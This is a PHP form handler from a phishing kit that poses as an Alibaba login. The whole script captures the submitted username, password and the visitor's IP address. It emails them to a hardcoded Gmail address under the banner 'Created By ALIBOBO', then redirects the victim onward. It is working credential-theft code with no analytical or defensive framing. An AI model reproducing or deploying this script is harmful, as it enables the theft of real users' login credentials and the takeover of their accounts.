<?

$ip = getenv("REMOTE_ADDR");
$message .= "--------------Alibaba Result-----------------------\n";
$message .= "ID: ".$_POST['user']."\n";
$message .= "Password: ".$_POST['pass']."\n";

$message .= "IP: ".$ip."\n";
$message .= "---------------Created By ALIBOBO----------------------------\n";


$recipient = "willism229@gmail.com";
$subject = "New Message From ALIBOBO";
 mail("$to", " Login", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: page1.html");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>